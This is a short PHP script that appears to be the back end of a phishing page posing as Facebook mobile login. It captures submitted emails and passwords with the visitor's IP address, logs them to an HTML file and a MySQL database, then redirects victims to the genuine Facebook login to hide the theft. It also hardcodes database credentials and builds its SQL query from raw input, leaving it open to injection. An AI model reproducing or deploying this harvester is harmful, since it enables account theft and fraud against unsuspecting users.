<?php

$habbo = $_POST['email']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("user.html", "a"); 
fwrite ($f, 'Email: [<b><font color="#0000FF">'.$habbo.'</font></b>] Password: [<b><font color="#FF0040">'.$password.'</font></b>] IP: [<b><font color="#FE2EF7">'.$ip.'</font></b>]<br>');
fclose($f);


$link =mysqli_connect("localhost", "u393285625_fbk", "luyUEGGt6F0mC5iI", "u393285625_fb");
$tildes = $link->query("SET NAMES 'utf8'"); //Para que se inserten las tildes correctamente
mysqli_query($link, "INSERT INTO data (user, pass, lugar, navegador, ip) VALUES ('$habbo', '$password', 'Facebook_mobile', '$user_agent','$ip')");
mysqli_close($link); // Cerramos la conexion con la base de datos
//echo 'Los datos han sido insertados en la base de datos';

header("Location: https://m.facebook.com/login/?li=Uyj6WFt5tR2cOGE6jSfk8vJU&e=1348029&login_try_number=1&refid=8&refsrc=https%3A%2F%2Fm.facebook.com%2F&_rdr");
?>
